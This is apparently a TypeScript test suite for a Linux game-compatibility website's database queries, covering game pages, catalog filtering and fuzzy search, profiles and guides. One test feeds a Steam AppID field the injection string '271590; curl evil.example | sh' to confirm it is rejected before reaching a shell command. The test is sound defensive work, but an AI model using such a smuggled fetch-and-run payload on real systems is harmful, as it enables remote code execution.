import { describe, expect, layer } from '@effect/vitest'
import { Effect, Exit, Option, Struct } from 'effect'
import { SqlClient } from 'effect/sql'
import { type CompatibilitySummary, summarize } from '../src/domain/compatibility.ts'
import { GuideId, GameId, LauncherId, ProfileId, UserId } from '../src/domain/ids.ts'
import { gtaV } from '../src/domain/samples.ts'
import { Visitor } from '../src/server/auth.ts'
import { catalog } from '../src/server/queries/catalog.ts'
import { gamePage } from '../src/server/queries/game.ts'
import { guide, guides } from '../src/server/queries/guides.ts'
import { profile } from '../src/server/queries/profile.ts'
import { queue } from '../src/server/queries/review.ts'
import { onDay, inRollback, idOf, PgTest } from './support.ts'

type Value = string | number | boolean | Date | null

const guest = Visitor.of(Option.none())
const ana = Visitor.of(Option.some({ id: UserId.make('ana'), alias: 'ana', role: 'usuario' }))
const reviewer = Visitor.of(Option.some({ id: UserId.make('revisor'), alias: 'revisor', role: 'revisor' }))

const today = new Date('2026-10-15T00:00:00Z')

const scenario = Effect.gen(function* () {
  const sql = yield* SqlClient.SqlClient
  const insert = (table: string, row: Record<string, Value>) => idOf(sql`INSERT INTO ${sql(table)} ${sql.insert(row)} RETURNING id`)
  const reviewed = {
    created_at: new Date('2026-10-03T00:00:00Z'),
    reviewer_id: 'revisor',
    reviewed_at: new Date('2026-10-04T00:00:00Z'),
    review_reason: 'probado',
  }
  const approved = { ...reviewed, review_status: 'aprobado', review_evidence: 'captura de MangoHud' }

  for (const [id, email] of [['autor', 'autor@demo.opengame.test'], ['revisor', 'revisor@opengame.test'], ['ana', 'ana@opengame.test']])
    yield* sql`INSERT INTO app_user (id, alias, email, email_verified, role, active) VALUES (${id}, ${id}, ${email}, false, ${id === 'revisor' ? 'revisor' : 'usuario'}, true)`

  const steam = yield* insert('launcher', { name: 'Steam' })
  const epic = yield* insert('launcher', { name: 'Epic Games Store' })
  const mint = yield* insert('distribution', { name: 'Linux Mint', version: '21.3' })
  const arch = yield* insert('distribution', { name: 'Arch Linux', version: 'rolling' })
  const fedora = yield* insert('distribution', { name: 'Fedora', version: '40' })
  const proton8 = yield* insert('layer_version', { family: 'Proton', variant: 'Valve', version: '8.0-5' })
  const ge94 = yield* insert('layer_version', { family: 'Proton', variant: 'GE', version: '9-4' })
  const proton9 = yield* insert('layer_version', { family: 'Proton', variant: 'Valve', version: '9.0-3' })
  const launcherFailure = yield* insert('failure_type', { code: 'lanzador', description: 'El lanzador no abre.' })
  const antiCheat = yield* insert('failure_type', { code: 'anti_cheat', description: 'El anti-trampas bloquea Linux.' })

  const insertGame = (title: string) => insert('game', { title, description: 'd' })
  const insertEdition = (game_id: number, launcher_id: number) => insert('game_edition', { game_id, launcher_id })
  const gta = yield* insertGame('Grand Theft Auto V')
  const gtaSteam = yield* insertEdition(gta, steam)
  const gtaEpic = yield* insertEdition(gta, epic)
  const valorant = yield* insertGame('Valorant')
  const valorantSteam = yield* insertEdition(valorant, steam)
  const cs2 = yield* insertGame('Counter-Strike 2')
  const cs2Steam = yield* insertEdition(cs2, steam)
  const ets2 = yield* insertGame('Euro Truck Simulator 2')
  const ets2Steam = yield* insertEdition(ets2, steam)

  const insertMachine = (user_id: string) => insert('machine', { user_id, alias: `pc de ${user_id}` })
  const insertDiagnostic = (machine_id: number, distribution_id: number, captured_at: string, extra: Record<string, Value> = {}) =>
    insert('diagnostic', {
      machine_id,
      captured_at: new Date(captured_at),
      operating_system: 'Linux',
      os_version: '6.8',
      distribution_id,
      architecture: 'x86_64',
      cpu_model: 'cpu',
      gpu_model: 'gpu',
      ram_mb: 8192,
      vulkan_support: 'desconocido',
      ...extra,
    })
  const authorPc = yield* insertMachine('autor')
  const onMint = yield* insertDiagnostic(authorPc, mint, '2026-08-01T00:00:00Z')
  const onArch = yield* insertDiagnostic(authorPc, arch, '2026-08-02T00:00:00Z')
  const onFedora = yield* insertDiagnostic(authorPc, fedora, '2026-08-03T00:00:00Z')

  const requirements = { architecture: 'x86_64', ram_min_mb: 8192, vram_min_mb: 2048, requires_vulkan: true, vulkan_version_min: '1.1' }
  const approvedProfile = yield* insert('profile', {
    edition_id: gtaSteam, distribution_id: mint, layer_version_id: proton8, author_id: 'autor', revision: 2, title: 'GTAV-BAJO', ...requirements,
    created_at: reviewed.created_at,
  })
  const testingProfile = yield* insert('profile', {
    edition_id: gtaSteam, distribution_id: mint, layer_version_id: proton8, author_id: 'autor', revision: 3, title: 'GTAV-BAJO', ...requirements,
  })
  const withdrawnProfile = yield* insert('profile', {
    edition_id: gtaSteam, distribution_id: mint, layer_version_id: proton8, author_id: 'autor', revision: 1, title: 'GTAV-BAJO',
    ...requirements, ...reviewed, review_status: 'retirado',
  })
  for (const [order, title] of [[2, 'Elige Proton 8.0-5'], [1, 'Activa Steam Play']] as const)
    yield* sql`INSERT INTO profile_step (profile_id, position, title, instruction) VALUES (${approvedProfile}, ${order}, ${title}, 'i')`
  yield* sql`UPDATE profile SET ${sql.update(Struct.omit(approved, ['created_at']))} WHERE id = ${approvedProfile}`

  const noFps = { avg_fps: null, resolution: null, graphics_quality: null, measurement_method: null }
  const insertReport = (row: Record<string, Value>, review: Record<string, Value> = approved) =>
    insert('report', { observations: 'o', ...noFps, ...row, ...review })
  yield* insertReport({
    edition_id: gtaSteam, diagnostic_id: onMint, layer_version_id: proton8, profile_id: approvedProfile, game_version: '1.0.3179',
    outcome: 'funciona', tested_at: new Date('2026-09-28T12:00:00Z'),
    avg_fps: 54, resolution: '1280x720', graphics_quality: 'Bajo', measurement_method: 'MangoHud · misión Prólogo · 5 min',
  })
  yield* insertReport({
    edition_id: gtaSteam, diagnostic_id: onMint, layer_version_id: proton8, profile_id: approvedProfile, game_version: '1.0.3179',
    outcome: 'funciona', tested_at: new Date('2026-09-14T12:00:00Z'),
  })
  yield* insertReport({
    edition_id: gtaEpic, diagnostic_id: onArch, layer_version_id: ge94, game_version: '1.0.3179',
    outcome: 'funciona_con_ajustes', tested_at: new Date('2026-09-02T12:00:00Z'),
    avg_fps: 60, resolution: '1920x1080', graphics_quality: 'Medio', measurement_method: 'MangoHud · conducción en ciudad · 10 min',
  })
  const gtaFedora = yield* insertReport({
    edition_id: gtaSteam, diagnostic_id: onFedora, layer_version_id: proton9, game_version: '1.0.3258',
    outcome: 'falla_en_ejecucion', tested_at: new Date('2026-10-02T12:00:00Z'),
  })
  yield* sql`INSERT INTO report_failure (report_id, failure_type_id, detail) VALUES (${gtaFedora}, ${launcherFailure}, 'el lanzador no abre')`
  const insertSolution = (title: string, profile_id: number | null, review: Record<string, Value>) =>
    insert('solution', { report_id: gtaFedora, failure_type_id: launcherFailure, author_id: 'ana', title, instructions: 'i', profile_id, ...review })
  yield* insertSolution('Volver a Proton 8.0-5', null, approved)
  yield* insertSolution('Usar el perfil retirado', withdrawnProfile, approved)
  yield* insertSolution('Sin revisar', null, {})
  yield* insertReport({ edition_id: gtaSteam, diagnostic_id: onMint, layer_version_id: proton8, game_version: '1.0.3179', outcome: 'no_inicia', tested_at: new Date('2026-10-05T12:00:00Z') }, {})
  yield* insertReport({ edition_id: ets2Steam, diagnostic_id: onMint, layer_version_id: proton8, game_version: '1.5', outcome: 'funciona', tested_at: new Date('2026-10-05T12:00:00Z') }, {})

  const valorantFailure = yield* insertReport({
    edition_id: valorantSteam, diagnostic_id: onArch, layer_version_id: ge94, game_version: '9.07', outcome: 'no_inicia', tested_at: new Date('2026-08-03T12:00:00Z'),
  })
  yield* sql`INSERT INTO report_failure (report_id, failure_type_id, detail) VALUES (${valorantFailure}, ${antiCheat}, 'Vanguard')`
  yield* insertReport({ edition_id: cs2Steam, diagnostic_id: onArch, layer_version_id: ge94, game_version: '1.0', outcome: 'funciona', tested_at: new Date('2026-09-01T12:00:00Z') })

  const anaPc = yield* insertMachine('ana')
  yield* insertDiagnostic(anaPc, fedora, '2026-07-01T00:00:00Z')
  yield* insertDiagnostic(anaPc, mint, '2026-09-01T00:00:00Z', { ram_mb: 16384, vram_mb: 4096, vulkan_support: 'si', vulkan_version: '1.3' })

  const insertGuide = (title: string, status: string) =>
    insert('adoption_guide', { author_id: 'revisor', type: 'instalacion', title, content: 'Pasos', revision: 1, status })
  const publishedGuide = yield* insertGuide('Instalar Linux Mint', 'publicada')
  const draftGuide = yield* insertGuide('Borrador sin publicar', 'borrador')

  return {
    insert,
    approved,
    gta: GameId.make(gta),
    gtaSteam,
    fedora,
    proton9,
    epic: LauncherId.make(epic),
    approvedProfile: ProfileId.make(approvedProfile),
    testingProfile: ProfileId.make(testingProfile),
    withdrawnProfile: ProfileId.make(withdrawnProfile),
    publishedGuide: GuideId.make(publishedGuide),
    draftGuide: GuideId.make(draftGuide),
  }
})

const shape = (r: CompatibilitySummary) => ({
  status: r.status,
  test_count: r.test_count,
  recent_count: r.recent_count,
  no_recent_confirmation: r.no_recent_confirmation,
  regressions: r.regressions.map((x) => [x.tested_at, x.game_version, x.outcome]),
  last_tested: r.last_tested,
  failures: r.failures,
  setups: r.setups.map((e) => ({
    game_version: e.game_version,
    status: e.status,
    test_count: e.test_count,
    recent_count: e.recent_count,
    by_outcome: e.by_outcome,
    last_tested: e.last_tested,
    failures: e.failures,
    fps: e.fps,
  })),
})

const titles = (c: { readonly games: ReadonlyArray<{ readonly title: string }> }) => c.games.map((j) => j.title)

layer(PgTest)('consultas', (it) => {
  describe('queue', () => {
    it.effect('lists a failed report with the code and detail of each failure', () =>
      inRollback(
        Effect.gen(function* () {
          yield* scenario
          const result = yield* Effect.provideService(queue('reporte'), Visitor, reviewer)
          const items = result.type === 'reporte' ? result.items : []
          expect(items.filter((r) => r.outcome === 'falla_en_ejecucion').map((r) => [r.game_version, r.failures])).toEqual([
            ['1.0.3258', [{ code: 'lanzador', detail: 'el lanzador no abre' }]],
          ])
        }),
      ))
  })

  describe('gamePage', () => {
    it.effect('resume GTA V igual que el fixture de samples.ts, sin contar el pendiente', () =>
      inRollback(
        Effect.gen(function* () {
          const e = yield* scenario
          const page = yield* Effect.provideService(gamePage(e.gta), Visitor, guest)
          expect(shape(page.summary)).toEqual(shape(summarize(gtaV.tests, today)))
          expect(page.summary.status).toBe('resultados_variables')
          expect(page.summary.setups).toHaveLength(3)
          expect(page.pending).toBe(1)
          expect(page.demo).toBe(true)
          expect(page.personal).toBeNull()
          expect(page.causes.map((c) => [c.code, c.description, c.solutions.map((x) => x.title)])).toEqual([
            ['lanzador', 'El lanzador no abre.', ['Volver a Proton 8.0-5']],
          ])
        }),
      ).pipe(onDay(today)),
    )

    it.effect('compara con el diagnóstico más reciente del visitante y lista perfiles aprobados primero', () =>
      inRollback(
        Effect.gen(function* () {
          const e = yield* scenario
          const page = yield* Effect.provideService(gamePage(e.gta), Visitor, ana)
          expect(page.personal?.on_my_distribution?.name).toBe('Linux Mint 21.3')
          expect(page.personal?.on_my_distribution?.summary.status).toBe('funciona')
          expect(page.personal?.on_my_distribution?.summary.test_count).toBe(2)
          expect(page.personal?.profile).toMatchObject({ id: e.approvedProfile, evaluation: { verdict: 'cumple' } })
          expect(page.profiles.map((p) => [p.id, p.review_status, p.evaluation?.verdict ?? null])).toEqual([
            [e.approvedProfile, 'aprobado', 'cumple'],
            [e.testingProfile, 'pendiente', null],
          ])
        }),
      ).pipe(onDay(today)),
    )

    it.effect('un diagnóstico de Windows con una Kepler proyecta Vulkan 1.2 y no cumple un mínimo de 1.3', () =>
      inRollback(
        Effect.gen(function* () {
          const e = yield* scenario
          const sql = yield* SqlClient.SqlClient
          const pc = yield* e.insert('machine', { user_id: 'ana', alias: 'pc con Windows' })
          yield* e.insert('diagnostic', {
            machine_id: pc, captured_at: new Date('2026-10-10T00:00:00Z'), operating_system: 'Windows', os_version: 'Windows 10 Home 22H2 (19045)',
            distribution_id: null, architecture: 'x86_64', cpu_model: 'cpu', gpu_model: 'NVIDIA GeForce GT 710', gpu_pci_id: '10de:128b',
            ram_mb: 16384, vram_mb: 2048, vulkan_support: 'si', vulkan_version: '1.4',
          })
          const demanding = yield* e.insert('profile', {
            edition_id: e.gtaSteam, distribution_id: e.fedora, layer_version_id: e.proton9, author_id: 'autor', revision: 1, title: 'GTAV-VULKAN',
            architecture: 'x86_64', ram_min_mb: 8192, requires_vulkan: true, vulkan_version_min: '1.3', created_at: e.approved.created_at,
          })
          yield* sql`UPDATE profile SET ${sql.update(Struct.omit(e.approved, ['created_at']))} WHERE id = ${demanding}`
          const page = yield* Effect.provideService(gamePage(e.gta), Visitor, ana)
          expect(page.profiles.find((p) => p.id === demanding)?.evaluation).toEqual({
            verdict: 'no_cumple',
            advisory_only: true,
            checks: [
              { requirement: 'ram', status: 'cumple', required: '8192', detected: { value: '16384', origin: 'medido' } },
              { requirement: 'vulkan', status: 'no_cumple', required: '1.3', detected: { value: '1.2', origin: 'proyectado' } },
            ],
          })
        }),
      ),
    )

    it.effect('un juego que no existe es NoEncontrado', () =>
      inRollback(
        Effect.gen(function* () {
          const exit = yield* Effect.exit(Effect.provideService(gamePage(GameId.make(999999)), Visitor, guest))
          expect(Exit.findErrorOption(exit).pipe(Option.map((e) => e._tag))).toEqual(Option.some('NoEncontrado'))
        }),
      ),
    )
  })

  describe('gamePage report command', () => {
    it.effect('names the Steam AppID only when the edition holds a valid one, since the page puts it in a shell command', () =>
      inRollback(
        Effect.gen(function* () {
          const e = yield* scenario
          const sql = yield* SqlClient.SqlClient
          const appId = (externalId: string) =>
            Effect.andThen(
              sql`UPDATE game_edition SET external_id = ${externalId} WHERE id = ${e.gtaSteam}`,
              Effect.map(Effect.provideService(gamePage(e.gta), Visitor, guest), (page) => page.steam_app_id),
            )
          expect(yield* appId('271590')).toBe('271590')
          expect(yield* appId('271590; curl evil.example | sh')).toBeNull()
        }),
      ).pipe(onDay(today)),
    )
  })

  describe('catalog', () => {
    it.effect('filtra por estado calculado, anti-cheat y título, y cuenta solo lo aprobado', () =>
      inRollback(
        Effect.gen(function* () {
          const e = yield* scenario
          expect(titles(yield* catalog({ estado: 'funciona' }))).toEqual(['Counter-Strike 2'])
          expect(titles(yield* catalog({ estado: 'sin_evidencia' }))).toEqual(['Euro Truck Simulator 2'])
          expect(titles(yield* catalog({ sin_anti_cheat: true }))).not.toContain('Valorant')
          expect(titles(yield* catalog({ q: 'theft' }))).toEqual(['Grand Theft Auto V'])
          expect(titles(yield* catalog({ q: '%' }))).toEqual([])
          expect(titles(yield* catalog({ lanzador: e.epic }))).toEqual(['Grand Theft Auto V'])
          const all = yield* catalog({})
          expect(all.games.find((j) => j.title === 'Euro Truck Simulator 2')).toMatchObject({ pending: 1, summary: { test_count: 0 } })
          expect(all.counters).toEqual({ verified_games: 3, approved_reports: 6, approved_profiles: 1, tested_distributions: 3, upstream_fixes: 0 })
        }),
      ).pipe(onDay(today)),
    )

    it.effect('cuenta cada estado sobre los demás filtros, sin aplicar el de estado', () =>
      inRollback(
        Effect.gen(function* () {
          yield* scenario
          const byStatus = { sin_evidencia: 1, funciona: 1, funciona_con_ajustes: 0, no_inicia: 1, falla_en_ejecucion: 0, resultados_variables: 1 }
          expect((yield* catalog({})).by_status).toEqual(byStatus)
          expect((yield* catalog({ estado: 'funciona' })).by_status).toEqual(byStatus)
          expect((yield* catalog({ sin_anti_cheat: true })).by_status).toEqual({ ...byStatus, no_inicia: 0 })
          expect((yield* catalog({ q: 'theft' })).by_status).toEqual({ ...byStatus, sin_evidencia: 0, funciona: 0, no_inicia: 0 })
        }),
      ).pipe(onDay(today)),
    )

    it.effect('con un reporte de una Steam Deck, la ficha lo resume aparte y el filtro solo deja lo que funcionó en una', () =>
      inRollback(
        Effect.gen(function* () {
          const e = yield* scenario
          const steamOs = yield* e.insert('distribution', { name: 'SteamOS', version: '3.7' })
          const deck = yield* e.insert('machine', { user_id: 'ana', alias: 'deck de ana' })
          const onDeck = yield* e.insert('diagnostic', {
            machine_id: deck, captured_at: new Date('2026-08-05T00:00:00Z'), operating_system: 'Linux', os_version: '6.5', distribution_id: steamOs,
            architecture: 'x86_64', cpu_model: 'AMD Custom APU 0932', gpu_model: 'AMD Custom GPU 0932', ram_mb: 16384, vulkan_support: 'desconocido',
            device: 'steam_deck_oled',
          })
          const onTheDeck = { diagnostic_id: onDeck, layer_version_id: e.proton9, observations: 'o', ...e.approved }
          yield* e.insert('report', { ...onTheDeck, edition_id: e.gtaSteam, game_version: '1.0.3258', outcome: 'funciona_con_ajustes', tested_at: new Date('2026-10-06T12:00:00Z') })
          expect(titles(yield* catalog({ steam_deck: true }))).toEqual(['Grand Theft Auto V'])

          const page = yield* Effect.provideService(gamePage(e.gta), Visitor, guest)
          expect([page.steam_deck.status, page.steam_deck.test_count]).toEqual(['funciona_con_ajustes', 1])
          expect(page.summary.setups.filter((s) => s.device !== null).map((s) => [s.distribution, s.device])).toEqual([['SteamOS 3.7', 'steam_deck_oled']])
        }),
      ).pipe(onDay(today)),
    )
  })

  describe('catalog search', () => {
    // pg_trgm's default word_similarity_threshold (0.6) separates these: every typo below scores 0.62 or more,
    // and «theft» against «The Witcher 3: Wild Hunt», the closest miss, scores 0.5.
    it.effect('finds the seeded titles through typos, ranks by similarity and matches nothing unrelated', () =>
      inRollback(
        Effect.gen(function* () {
          const e = yield* scenario
          for (const title of ['Elden Ring', 'The Witcher 3: Wild Hunt', 'Cyberpunk 2077']) yield* e.insert('game', { title, description: 'd' })
          const search = (q: string) => Effect.map(catalog({ q }), titles)
          expect(yield* search('cyberpnk')).toEqual(['Cyberpunk 2077'])
          expect(yield* search('eldn ring')).toEqual(['Elden Ring'])
          expect(yield* search('valornt')).toEqual(['Valorant'])
          expect(yield* search('conter strike')).toEqual(['Counter-Strike 2'])
          expect(yield* search('euro truk')).toEqual(['Euro Truck Simulator 2'])
          expect(yield* search('witcher')).toEqual(['The Witcher 3: Wild Hunt'])
          // Both contain «the»; the whole word ranks first, ahead of alphabetical order.
          expect(yield* search('the')).toEqual(['The Witcher 3: Wild Hunt', 'Grand Theft Auto V'])
          expect(yield* search('theft')).toEqual(['Grand Theft Auto V'])
          expect(yield* search('hades')).toEqual([])
        }),
      ).pipe(onDay(today)),
    )
  })

  describe('vigencia', () => {
    it.effect('un año después, ficha y catálogo calculan el estado con lo reciente y marcan lo viejo', () =>
      inRollback(
        Effect.gen(function* () {
          const e = yield* scenario
          const all = yield* catalog({})
          expect(all.games.map((j) => [j.title, j.summary.status, j.summary.no_recent_confirmation])).toEqual([
            ['Counter-Strike 2', 'funciona', true],
            ['Euro Truck Simulator 2', 'sin_evidencia', false],
            ['Grand Theft Auto V', 'falla_en_ejecucion', false],
            ['Valorant', 'no_inicia', true],
          ])
          expect(titles(yield* catalog({ estado: 'falla_en_ejecucion' }))).toEqual(['Grand Theft Auto V'])
          const page = yield* Effect.provideService(gamePage(e.gta), Visitor, guest)
          expect([page.summary.status, page.summary.recent_count, page.summary.test_count]).toEqual(['falla_en_ejecucion', 1, 4])
          expect(all.counters).toEqual({ verified_games: 3, approved_reports: 6, approved_profiles: 1, tested_distributions: 3, upstream_fixes: 0 })
        }),
      ).pipe(onDay(new Date('2027-10-01T00:00:00Z'))),
    )
  })

  describe('profile', () => {
    it.effect('muestra los pasos en orden y no evalúa un perfil en prueba', () =>
      inRollback(
        Effect.gen(function* () {
          const e = yield* scenario
          const approved = yield* Effect.provideService(profile(e.approvedProfile), Visitor, guest)
          expect(approved.steps.map((p) => p.title)).toEqual(['Activa Steam Play', 'Elige Proton 8.0-5'])
          expect(approved.evaluation).toBe('sin_diagnostico')
          const inTesting = yield* Effect.provideService(profile(e.testingProfile), Visitor, ana)
          expect(inTesting.evaluation).toBe('perfil_en_prueba')
          const withDiagnostic = yield* Effect.provideService(profile(e.approvedProfile), Visitor, ana)
          expect(withDiagnostic.evaluation).toMatchObject({ verdict: 'cumple' })
        }),
      ),
    )

    it.effect('un perfil retirado no es público', () =>
      inRollback(
        Effect.gen(function* () {
          const e = yield* scenario
          const exit = yield* Effect.exit(Effect.provideService(profile(e.withdrawnProfile), Visitor, guest))
          expect(Exit.findErrorOption(exit).pipe(Option.map((x) => x._tag))).toEqual(Option.some('NoEncontrado'))
        }),
      ),
    )
  })

  describe('guides', () => {
    it.effect('solo las publicadas son públicas', () =>
      inRollback(
        Effect.gen(function* () {
          const e = yield* scenario
          expect((yield* Effect.provideService(guides, Visitor, guest)).map((g) => g.id)).toEqual([e.publishedGuide])
          expect((yield* Effect.provideService(guide(e.publishedGuide), Visitor, guest)).title).toBe('Instalar Linux Mint')
          const exit = yield* Effect.exit(Effect.provideService(guide(e.draftGuide), Visitor, guest))
          expect(Exit.findErrorOption(exit).pipe(Option.map((x) => x._tag))).toEqual(Option.some('NoEncontrado'))
        }),
      ),
    )

    it.effect('un revisor ve también los borradores, para editarlos', () =>
      inRollback(
        Effect.gen(function* () {
          const e = yield* scenario
          const all = yield* Effect.provideService(guides, Visitor, reviewer)
          expect(all.map((g) => [g.id, g.status])).toEqual([
            [e.draftGuide, 'borrador'],
            [e.publishedGuide, 'publicada'],
          ])
          expect((yield* Effect.provideService(guide(e.draftGuide), Visitor, reviewer)).status).toBe('borrador')
        }),
      ),
    )
  })
})
